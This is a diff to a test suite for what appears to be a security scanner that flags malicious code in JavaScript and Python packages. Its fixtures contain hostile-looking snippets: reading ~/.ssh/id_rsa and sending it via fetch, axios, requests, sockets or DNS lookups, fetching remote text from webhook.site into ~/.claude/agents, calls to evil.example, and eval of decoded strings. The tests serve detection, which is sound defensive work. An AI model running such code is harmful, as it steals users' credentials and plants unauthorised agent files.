@@ -180,10 +180,17 @@ def test_i5_claude_session_data_is_credential(src):
     assert ("exfil.combo", Severity.CRITICAL) in pairs([("index.js", src)])
 
 
-def test_i5_install_dir_write_with_network_is_med():
-    src = ("async function go(){ const t=await (await fetch('https://e.example/a.md')).text();"
+def test_i5_install_dir_write_with_exfil_host_call_is_med():
+    src = ("async function go(){ const t=await (await fetch('https://webhook.site/a.md')).text();"
            " fs.writeFileSync(os.homedir()+'/.claude/agents/helper.md', t); }\n")
-    assert pairs([("index.js", src)]) == {("install-dir-access", Severity.MED)}
+    assert ("install-dir-access", Severity.MED) in pairs([("index.js", src)])
+
+
+def test_i5_install_dir_write_with_vendor_update_check_is_low():
+    # round 2: an update-check GET to a fixed vendor host is not exfiltration
+    src = ("function install(n, b){ fs.writeFileSync(os.homedir()+'/.claude/agents/'+n, b);"
+           " https.get('https://registry.npmjs.org/x/latest', () => {}); }\n")
+    assert pairs([("index.js", src)]) == {("install-dir-access", Severity.LOW)}
 
 
 def test_i5_project_claude_dir_is_install_dir():
@@ -269,3 +276,70 @@ def test_minor7_small_code_file_with_nul_is_truncated_med(tmp_path):
     files, findings = load_files(_write(tmp_path, {"index.js": nul_js, "img.bin": b"ab\x00cd"}))
     assert files == []
     assert [(f.rule, f.severity, f.file) for f in findings] == [("files.truncated", Severity.MED, "index.js")]
+
+
+# ---------------------------------------------------------------- round 2: real thunderbird-mcp shapes
+
+
+def test_eval_of_string_literal_mentioning_atob_is_not_decoded():
+    src = "vm.runInContext(\"typeof atob + ',' + typeof btoa\", sandbox);\neval('atob');\nexec('b64decode(x)')\n"
+    assert pairs([("src/a.js", src)]) == set()
+    assert pairs([("a.py", "exec('base64.b64decode(x)', g)\n")]) == set()
+    # real decode calls still count, including through a variable and with encoding-name literals
+    assert ("obfuscation.eval-decoded", Severity.CRITICAL) in pairs([("a.js", "eval(Buffer.from(s, 'hex').toString());\n")])
+    assert ("obfuscation.eval-decoded", Severity.CRITICAL) in pairs([("a.js", "const c = atob(s);\nvm.runInContext(c, x);\n")])
+    assert ("obfuscation.eval-decoded", Severity.CRITICAL) in pairs([("a.py", "import codecs\nexec(codecs.decode(s, 'rot13'))\n")])
+
+
+def test_url_strings_are_not_network_calls():
+    src = ("function f() {\n  const urls = ['file:///etc/passwd', 'file:///C:/Users/alice/.ssh/id_rsa',"
+           " 'http://127.0.0.1:8080/admin', 'imap://u@m.example/fetch%3EUID'];\n  return urls;\n}\n")
+    assert ("exfil.combo", Severity.CRITICAL) not in pairs([("src/a.js", src)])
+    assert not any(r == "exfil.combo" for r, _ in pairs([("test/a.cjs", src)]))
+
+
+def test_loopback_calls_are_not_outbound():
+    src = "async function f() {\n  const k = fs.readFileSync('/h/.ssh/id_rsa');\n  await fetch('http://127.0.0.1:8765/rpc', {body: k});\n}\n"
+    assert pairs([("src/a.js", src)]) == {("credential-access", Severity.HIGH)}
+    for host in ("localhost:3000", "0.0.0.0", "[::1]:80"):
+        assert not any(r == "exfil.combo" for r, _ in pairs([("a.js", src.replace("127.0.0.1:8765", host))]))
+    # a non-loopback URL in the same call still counts
+    mixed = src.replace("'http://127.0.0.1:8765/rpc'", "'http://127.0.0.1/' + 'https://evil.example/x'")
+    assert ("exfil.combo", Severity.CRITICAL) in pairs([("a.js", mixed)])
+
+
+@pytest.mark.parametrize("call", [
+    "fetch(u, {body: k})", "axios.post(u, k)", "got(u, {body: k})", "https.request(u).end(k)",
+    "net.connect(443, h).end(k)", "new XMLHttpRequest()", "dns.resolve(k + '.x.invalid')",
+])
+def test_real_network_calls_still_combo(call):
+    src = f"async function f() {{\n  const k = fs.readFileSync('/h/.ssh/id_rsa');\n  {call};\n}}\n"
+    assert ("exfil.combo", Severity.CRITICAL) in pairs([("a.js", src)]), call
+
+
+@pytest.mark.parametrize("call", ["requests.post(u, data=k)", "urllib.request.urlopen(u, data=k)",
+                                  "socket.create_connection((h, 443)).send(k)", "httpx.post(u, content=k)"])
+def test_real_python_network_calls_still_combo(call):
+    src = f"def f():\n    k = open('/h/.ssh/id_rsa').read()\n    {call}\n"
+    assert ("exfil.combo", Severity.CRITICAL) in pairs([("a.py", src)]), call
+
+
+@pytest.mark.parametrize("head", [
+    b"GIF89a\x80\x02\xe0\x01\xf7\x00\x00", b"GIF87a\x10\x00\x10\x00\x80\x00\x00", b"%PDF-1.7\n%\xe2\xe3",
+    b"RIFF\x10\x00\x00\x00WEBPVP8 ", b"\x00\x00\x01\x00\x01\x00", b"BM\x36\x00\x0c\x00\x00\x00\x00\x00",
+    b"II*\x00\x08\x00", b"MM\x00*\x00\x00", b"wOFF\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00",
+    b"wOF2\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00", b"\x00\x01\x00\x00\x00\x10", b"OTTO\x00\x0c",
+    b"\x00\x00\x00\x18ftypmp42", b"ID3\x03\x00\x00", b"OggS\x00\x02", b"SQLite format 3\x00",
+])
+def test_round2_media_magic_is_binary(tmp_path, head):
+    (tmp_path / "docs").mkdir()
+    (tmp_path / "docs" / "f").write_bytes(head + b"\x00" * 1_100_000)
+    _, findings = load_files(tmp_path)
+    assert [(f.rule, f.severity) for f in findings] == [("files.binary-unscanned", Severity.LOW)]
+
+
+@pytest.mark.parametrize("text", [b"GIF89a=1;var x='\x00';", b"BM;var x='\x00';", b"OTTO;x='\x00'", b"wOFF;x='\x00'"])
+def test_round2_forged_media_header_text_is_truncated(tmp_path, text):
+    (tmp_path / "a.js").write_bytes(text + b"a" * 1_100_000)
+    _, findings = load_files(tmp_path)
+    assert [(f.rule, f.severity) for f in findings] == [("files.truncated", Severity.MED)]
